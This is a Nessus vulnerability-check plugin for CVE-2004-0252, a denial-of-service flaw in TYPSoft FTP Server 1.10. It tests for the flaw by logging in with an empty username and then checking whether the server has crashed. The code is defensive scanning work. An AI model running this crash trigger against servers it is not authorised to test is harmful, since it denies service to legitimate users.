#
# This script was written by David Maciejak <david dot maciejak at kyxar dot fr>
#
# Ref: "intuit bug_hunter" <intuit@linuxmail.org>
#
# This script is released under the GNU GPLv2
#
# Changes by Tenable:
# - Revised plugin title, added OSVDB ref (2/03/2009)


include("compat.inc");

if(description)
{
 script_id(14707);
 script_cve_id("CVE-2004-0252");
 script_bugtraq_id(9573);
 script_xref(name:"OSVDB", value:"6613");
 script_version("$Revision: 1.14 $");

 script_name(english:"TYPSoft FTP Server Empty Username DoS");

 script_set_attribute(attribute:"synopsis", value:
"It is possible to crash the remote FTP server." );
 script_set_attribute(attribute:"description", value:
"The remote host seems to be running TYPSoft FTP server, version 1.10. 

This version is prone to a remote denial of service flaw.  By sending
an empty login username, an attacker can cause the FTP server to
crash, denying service to legitimate users." );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/bugtraq/2004-02/0115.html" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P" );

script_end_attributes();

 
 summary["english"] = "Checks for TYPSoft FTP server empty username DoS ";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_DENIAL);
 
 
 script_copyright(english:"This script is Copyright (C) 2004-2009 David Maciejak");
 script_family(english:"FTP");
 script_dependencie("find_service_3digits.nasl", "ftpserver_detect_type_nd_version.nasl");
 script_require_ports("Services/ftp", 21);
 exit(0);
}

#
# The script code starts here
#

include("ftp_func.inc");

login = "";
pass  = get_kb_item("ftp/password");
port = get_kb_item("Services/ftp");

if(!port)port = 21;
if (! get_port_state(port)) exit(0);

if (get_kb_item('ftp/'+port+'/broken') || 
    get_kb_item('ftp/'+port+'/backdoor')) exit(0);

soc = open_sock_tcp(port);
if (! soc ) exit(0);
if (! ftp_authenticate(socket:soc, user:login, pass:pass)) exit(0);

#ftp_close(socket: soc);
for (i = 0; i < 3; i ++)
{
  sleep(1);
  soc2 = open_sock_tcp(port);
  if (soc2) break;
}

if (! soc2 || ! recv_line(socket:soc2, length:4096))
 security_warning(port);

if (soc2) close(soc2);
close(soc);
